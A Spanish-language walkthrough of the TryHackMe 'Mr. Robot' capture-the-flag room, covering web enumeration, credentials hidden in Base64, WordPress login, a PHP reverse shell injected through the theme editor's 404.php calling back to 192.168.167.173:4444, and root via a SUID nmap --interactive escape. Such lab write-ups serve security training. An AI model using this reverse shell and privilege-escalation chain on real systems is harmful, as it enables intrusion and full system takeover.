---
title: "TryHackMe - Mr. Robot"
description: "Enumeración web, exposición vía robots.txt, credenciales en Base64, acceso a WordPress, reverse shell mediante Theme Editor y escalada de privilegios con nmap legacy --interactive."
pubDate: "2025-12-12"
draft: false
difficulty: insane
tags: ["htb", "linux", "wordpress", "web", "enumeration", "suid", "privesc"]

---

**IP:** `10.66.131.162`  
**OS:** Linux  


---

## 🌐 Stack Tecnológico
- WordPress 4.3.1
- PHP
- Linux

---

## 🧭 Enumeración Inicial

```bash
nmap -p- -sC -sV 10.66.131.162
```

**Puerto expuesto:**
- `80/tcp` → HTTP

**Hallazgos relevantes (http-enum):**
- `/robots.txt`
- `/wp-login.php`
- `/wp-admin/upgrade.php`
- `/readme.html`
- `/admin/`
- `/0/`
- `/image/`
- `/feed/` → WordPress **4.3.1**

Confirmación de WordPress legacy mediante archivos estáticos:
- rss.png → WP 2.2
- jquery/suggest.js → WP 2.5
- comment-reply.js → WP 2.7

---

## 🤖 robots.txt

```bash
curl -s http://10.66.131.162/robots.txt
```

**Contenido expuesto:**
- `fsocity.dic`
- `key-1-of-3.txt`

```bash
wget http://10.66.131.162/fsocity.dic
wget http://10.66.131.162/key-1-of-3.txt
```

---

## 📚 Preparación de diccionario

El diccionario original contiene miles de duplicados.

```bash
sort fsocity.dic | uniq > fs_mod.dic
wc -c fsocity.dic fs_mod.dic
```

- fsocity.dic → **7.2 MB**
- fs_mod.dic → **~96 KB**

---

## 📂 Enumeración de directorios

```bash
gobuster dir \
-w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt \
-u http://10.66.131.162
```

Dentro del archivo `license` se encuentra una cadena en Base64:

```
ZWxsaW90OkVSMjgtMDY1Mgo=
```

Decodificación:

```bash
echo ZWxsaW90OkVSMjgtMDY1Mgo= | base64 --decode
```

**Credenciales obtenidas:**
- `elliot : ER28-0652`

---

## 🔐 Acceso a WordPress

```bash
http://10.66.131.162/wp-login.php
```

Login exitoso con las credenciales encontradas.

---

## 🔁 Reverse Shell

Edición del theme (página **404.php**):

```php

<?php
exec("/bin/bash -c 'bash -i >& /dev/tcp/192.168.167.173/4444 0>&1'");
?>
```

Listener:

```bash
nc -lvnp 4444
```

---

## 🧭 Post-Explotación – Usuario robot

```bash
cd /home/robot
ls -la
```

Archivos sensibles:
- `key-2-of-3.txt`
- `password.raw-md5`

Hash encontrado:
```text 
c3fcd3d76192e4007dfb496cca67e13b
```

Password:

```text
abcdefghijklmnopqrstuvwxyz
```

```bash
su robot
python -c 'import pty; pty.spawn("/bin/bash")'
```

---

## 🧨 Escalada de Privilegios

Enumeración de binarios SUID:

```bash
find / -perm +6000 -type f -exec ls -ld {} \; 2>/dev/null
```

Binario vulnerable:
- `nmap` legacy (SUID)

```bash
nmap --interactive
```

Dentro del prompt:

```bash
!sh
```

---

## 👑 Root Access

```bash
whoami
# root
```
